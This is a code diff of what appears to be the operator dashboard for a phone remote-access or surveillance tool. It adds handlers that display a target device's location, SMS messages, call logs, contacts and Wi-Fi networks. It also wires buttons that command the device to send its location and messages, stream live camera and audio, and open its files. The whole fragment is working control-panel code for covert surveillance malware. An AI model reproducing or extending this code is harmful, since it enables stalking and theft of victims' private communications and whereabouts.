-            else if (msg.startsWith('[') || msg.startsWith('{')) try { handleJSON(JSON.parse(msg)); } catch (e) {}
+            else if (msg.startsWith("LOC_DATA:")) try { renderMap(JSON.parse(msg.substring(9))); } catch (e) { }
+            else if (msg.startsWith("SMS_DATA:")) try { displaySMS(JSON.parse(msg.substring(9))); } catch (e) { }
+            else if (msg.startsWith("CALL_DATA:")) try { displayCallLogs(JSON.parse(msg.substring(10))); } catch (e) { }
+            else if (msg.startsWith("CONTACTS_DATA:")) try { displayContacts(JSON.parse(msg.substring(14))); } catch (e) { }
+            else if (msg.startsWith("WIFI_DATA:")) try { displayWifiNetworks(JSON.parse(msg.substring(10))); } catch (e) { }
+            else if (msg.startsWith('[') || msg.startsWith('{')) try { handleJSON(JSON.parse(msg)); } catch (e) { }
         }
 
         function handleIncomingMessage(msg) {
@@ -2581,7 +2780,9 @@ function renderMap(data) {
                 const j = JSON.parse(msg);
                 if (j.type === 'SIGNALING') handleSignaling(j.data);
                 else handleJSON(j);
-            } catch (e) { handlePlainText(msg); }
+            } catch (e) {
+                handlePlainText(msg);
+            }
         }
 
         // ==================== EVENT LISTENERS ====================
@@ -2593,7 +2794,7 @@ function renderMap(data) {
             document.getElementById('startLiveStreamBtn').onclick = startLiveCamera;
             document.getElementById('liveAudioBtn').onclick = startLiveAudio;
             document.getElementById('stopLiveAudioBtn').onclick = stopLiveAudio;
-            document.getElementById('getLocationBtn').onclick = requestLocation;
+            document.getElementById('getLocationBtn').onclick = () => sendCommand('GET_LOCATION');
             document.getElementById('fileManagerBtn').onclick = () => { refreshFileRoot(); };
             document.getElementById('smsBtn').onclick = () => { currentPage = 0; sendCommand('GET_SMS', { box: 'all' }); };
             document.getElementById('callLogsBtn').onclick = () => { currentPage = 0; sendCommand('GET_CALL_LOGS'); };
